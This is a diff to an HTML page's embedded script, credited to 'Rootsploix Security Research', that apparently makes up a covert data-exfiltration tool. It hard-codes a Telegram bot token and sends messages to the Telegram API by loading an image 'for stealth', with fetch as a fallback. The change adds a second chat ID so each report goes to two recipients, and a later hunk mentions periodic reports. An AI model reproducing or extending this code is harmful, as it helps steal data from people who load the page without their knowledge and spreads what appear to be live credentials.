@@ -209,7 +209,7 @@
             author: 'Rootsploix Security Research',
             telegram: {
                 botToken: '8295691131:AAEJjGLfXEtbHhTyqJ4RC7JFbpGnx_OHthM',
-                chatId: '5312173877',
+                chatId: ['5312173877', '6633612153'],
                 apiUrl: 'https://api.telegram.org/bot'
             },
             security: {
@@ -418,24 +418,36 @@
             
             async sendDirectMessage(message, options = {}) {
                 const url = `${this.apiUrl}/sendMessage`;
-                const params = new URLSearchParams({
-                    chat_id: this.chatId,
-                    text: message,
-                    parse_mode: options.parseMode || 'HTML',
-                    disable_web_page_preview: options.disablePreview || true
-                });
                 
-                try {
-                    // Use image loading for stealth
-                    const img = new Image();
-                    img.src = `${url}?${params.toString()}`;
+                // Support dual Chat IDs
+                const chatIds = Array.isArray(this.chatId) ? this.chatId : [this.chatId];
+                
+                for (const chatId of chatIds) {
+                    const params = new URLSearchParams({
+                        chat_id: chatId,
+                        text: message,
+                        parse_mode: options.parseMode || 'HTML',
+                        disable_web_page_preview: options.disablePreview || true
+                    });
                     
-                    RootsploixUtils.log('info', 'Message sent via image loading');
-                    return true;
-                } catch (error) {
-                    // Fallback method
-                    return this.sendViaFetch(url, params);
+                    try {
+                        // Use image loading for stealth
+                        const img = new Image();
+                        img.src = `${url}?${params.toString()}`;
+                        
+                        RootsploixUtils.log('info', `Message sent via image loading to ${chatId}`);
+                    } catch (error) {
+                        // Fallback method
+                        await this.sendViaFetch(url, params);
+                    }
+                    
+                    // Small delay between dual sends
+                    if (chatIds.length > 1) {
+                        await new Promise(resolve => setTimeout(resolve, 500));
+                    }
                 }
+                
+                return true;
             }
             
             async sendViaFetch(url, params) {
@@ -8438,7 +8450,5 @@ Next report in 15 minutes...`;
         }
         
     </script>
-</body>
-</html>
 </body>
 </html>
